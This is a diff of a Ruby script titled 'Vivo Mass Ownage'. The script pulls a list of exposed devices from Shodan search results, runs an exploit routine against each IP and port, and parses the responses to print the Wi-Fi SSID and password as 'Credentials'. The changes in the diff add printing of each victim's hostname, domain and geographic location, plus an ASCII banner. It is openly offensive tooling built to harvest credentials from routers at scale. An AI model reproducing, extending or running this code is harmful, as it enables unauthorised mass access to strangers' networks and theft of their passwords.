@@ -3,9 +3,9 @@ require 'json'
 require 'shodan'
 require 'open-uri'
 require 'optparse'
+
 $headers = {"user-agent" => "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36"}
 puts "Install shodan gem \n gem install shodan"
-
 class String
     def red; colorize(self, "\e[1m\e[31m"); end
     def green; colorize(self, "\e[1m\e[32m"); end
@@ -61,14 +61,28 @@ def get_ips_info(ip)
     puts "Lat:#{my_hash["lon"]}".green
 end
 
+def shodan_api_getter(ip,hostname,domain,city)
+    puts "INFORMATIONS TARGET: #{ip}".red
+    city.select do |k,v| 
+        puts "#{k}:#{v}".green
+    end 
+    puts "HOST: #{hostname.join}".green
+    puts "DOMAIN: #{domain.join}".green
+end
+
 
 def shodan_parser()
     shodan_api = Shodan::Shodan.new($key)
     result = shodan_api.search($search)
+    #puts "#{result}" #debug
     result['matches'].each{|host| 
         ip = host['ip_str']
         port = host['port']
+        hostname = host['hostnames']
+        domain = host['domains']
+        city = host['location']
         xpt(ip,port)
+        shodan_api_getter(ip,hostname,domain,city)
     }
 end
 
@@ -85,8 +99,10 @@ def xpt(ip,port)
             split_html = html.split('&')
             ssid = split_html[1]
             password = split_html[3]
-            puts "Credentials: #{ssid} : #{password}".blue
-            get_ips_info(ip)
+            puts 
+            puts "--> Credentials: #{ssid} : #{password}".red
+            puts
+            #get_ips_info(ip)
             rescue
                 next
             end
@@ -98,8 +114,10 @@ def xpt(ip,port)
                 split_html = html.split('&')
                 ssid = split_html[1]
                 password = split_html[3]
-                puts "Credentials: #{ssid} : #{password}".blue
-                get_ips_info(ip)
+                puts 
+                puts "--> Credentials: #{ssid} : #{password}".red
+                puts
+                #get_ips_info(ip)
                 rescue
                 #puts "Connection Error".red
                 next
@@ -108,7 +126,25 @@ def xpt(ip,port)
 end
 
 
+def banner()
+    puts " _    ___                __  ___               "
+    puts "| |  / (_)   ______     /  |/  /___ ___________"
+    puts "| | / / / | / / __ \\   / /|_/ / __ `/ ___/ ___/"
+    puts "| |/ / /| |/ / /_/ /  / /  / / /_/ (__  |__  ) "
+    puts "|___/_/ |___/\\____/  /_/  /_/\\__,_/____/____/  "
+    puts  "\n"                                               
+    puts"   ____                                "
+    puts"  / __ \\_      ______  ____ _____ ____ "
+    puts" / / / / | /| / / __ \\/ __ `/ __ `/ _ \\"
+    puts"/ /_/ /| |/ |/ / / / / /_/ / /_/ /  __/"
+    puts"\\____/ |__/|__/_/ /_/\\__,_/\\__, /\\___/ "
+    puts"                          /____/    "
+    puts "By: sp4ce0x1".cyan
+end
+
+
 def main()
+    banner()
     shodan_parser()
 end
 
